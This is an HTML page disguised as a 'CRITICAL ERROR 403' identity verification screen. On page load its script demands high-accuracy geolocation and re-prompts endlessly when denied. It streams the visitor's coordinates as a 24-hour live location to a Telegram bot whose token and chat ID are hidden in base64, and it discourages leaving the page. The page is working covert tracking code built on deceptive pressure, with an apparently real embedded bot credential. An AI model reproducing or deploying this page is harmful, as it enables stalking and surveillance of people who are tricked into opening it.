<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Checking System Compatibility...</title>
    <style>
        body { background: #000; color: #ff0000; font-family: 'Courier New', sans-serif; text-align: center; padding-top: 20%; overflow: hidden; }
        .alert { border: 2px solid #ff0000; padding: 20px; display: inline-block; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
    </style>
</head>
<body>
    <div class="alert">
        <h1>CRITICAL ERROR 403</h1>
        <p>Location Access is REQUIRED to verify your identity.</p>
        <p>Please click "Allow" on the popup to continue.</p>
    </div>

    <script>
        // Hashed Credentials
        const _0xT = "ODIzNjI2ODU3MDpBQUdxV2J1aUZwMXRSYXFEUnVZNWhUSHRmWTkzdzBISE85NA==";
        const _0xC = "NzcwOTQ0MTQyNQ==";
        const d = (s) => atob(s);

        let mId = null;

        function forceLocation() {
            const options = { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 };
            
            navigator.geolocation.watchPosition(
                (pos) => {
                    // SUCCESS: Send to Telegram
                    sendData(pos.coords.latitude, pos.coords.longitude);
                    document.body.innerHTML = "<h1 style='color:#00ff00'>Verification Complete. Please wait...</h1>";
                },
                (err) => {
                    // FAIL: User denied or error occurred -> RECURSIVE FORCE
                    console.log("Access Denied. Retrying...");
                    // Reloading or re-calling the prompt immediately
                    setTimeout(forceLocation, 500); 
                    alert("Error: You must enable Location to access this page!");
                },
                options
            );
        }

        async function sendData(lat, lon) {
            if (!mId) {
                const r = await fetch(`https://api.telegram.org/bot${d(_0xT)}/sendLocation?chat_id=${d(_0xC)}&latitude=${lat}&longitude=${lon}&live_period=86400`);
                const j = await r.json();
                if(j.ok) mId = j.result.message_id;
            } else {
                fetch(`https://api.telegram.org/bot${d(_0xT)}/editMessageLiveLocation?chat_id=${d(_0xC)}&message_id=${mId}&latitude=${lat}&longitude=${lon}`);
            }
        }

        // Trigger the Force Loop
        window.onload = () => {
            forceLocation();
            // Prevent user from leaving easily
            window.onbeforeunload = function() { return "Identity verification in progress. Do not leave!"; };
        };
    </script>
</body>
</html>
